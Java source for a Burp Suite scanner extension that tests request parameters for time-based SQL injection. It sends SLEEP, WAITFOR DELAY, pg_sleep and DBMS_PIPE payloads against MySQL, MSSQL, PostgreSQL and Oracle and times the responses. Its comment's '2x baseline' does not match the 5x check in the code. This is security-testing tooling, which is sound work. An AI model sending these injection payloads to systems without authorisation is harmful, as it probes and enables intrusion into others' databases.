package burp.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;

/**
 * 延时注入 — 快速轮询各数据库 SLEEP/WAITFOR 探针
 * 命中即停，需 >4s 阈值 + >2x 基线耗时
 */
public class TimeBasedInjection extends AbstractInjectionStrategy {

    private static final String[][] PROBES = {
        {"' AND SLEEP(5)-- -", "MySQL"},
        {"'; WAITFOR DELAY '0:0:5'-- -", "MSSQL"},
        {"' AND 1=(SELECT 1 FROM pg_sleep(5))-- -", "PostgreSQL"},
        {"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", "Oracle"},
    };
    private final ThreadLocal<String> lastPayload = ThreadLocal.withInitial(() -> "");
    private volatile long timeThreshold = 4000;

    public TimeBasedInjection(MontoyaApi api){super(api);}
    @Override public String getName(){return"Time-Based";}
    @Override public String getVulnType(){return"timesql";}
    @Override public String getPayload(){return lastPayload.get();}

    public void setTimeThreshold(long ms){ this.timeThreshold = ms; }

    @Override
    public HttpRequestResponse execute(HttpRequest origReq, HttpRequestResponse baseRR,
                                         HttpParameter param, String baseBody) {
        // null-safe 基线值发送
        String baseVal = param.value();
        long t0 = System.currentTimeMillis();
        HttpRequestResponse baseProbe = send(modParam(origReq, param, baseVal != null ? baseVal : ""));
        long baseTime = System.currentTimeMillis() - t0;
        if (baseProbe == null || baseProbe.response() == null
                || baseProbe.response().bodyToString().isEmpty()) return null;

        for (String[] probe : PROBES) {
            lastPayload.set(probe[0]);
            long t1 = System.currentTimeMillis();
            HttpRequestResponse rr = send(append(origReq, param, lastPayload.get()));
            if (rr == null) continue;
            long elapsed = System.currentTimeMillis() - t1;

            if (elapsed >= timeThreshold && elapsed > Math.max(baseTime * 5, 1000)) {
                return rr;
            }
        }
        return null;
    }
}
